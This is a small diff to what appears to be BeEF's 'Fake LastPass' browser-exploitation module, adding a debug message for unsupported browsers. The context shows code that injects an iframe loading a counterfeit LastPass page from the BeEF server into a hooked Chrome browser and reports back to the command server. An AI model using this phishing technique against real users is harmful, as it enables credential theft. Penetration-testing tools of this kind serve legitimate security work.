@@ -25,6 +25,7 @@ beef.execute(function() {
 		beef.dom.createIframe('custom', {'src':beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/lp/index.html','id':'LPIFRAME'}, {'width':'294px','height':'352px','position':'fixed','right':'5px','top':'0px','z-index':beef.dom.getHighestZindex()+1,'border':'1px solid white','overflow':'hidden'}); 
 		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Chrome IFrame Created .. awaiting messages');	
 	} else {
+		beef.debug('[Fake LastPass] Unspported browser');
 		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=No IFrame Created -- browser is not Chrome', beef.are.status_error());
 	}
 
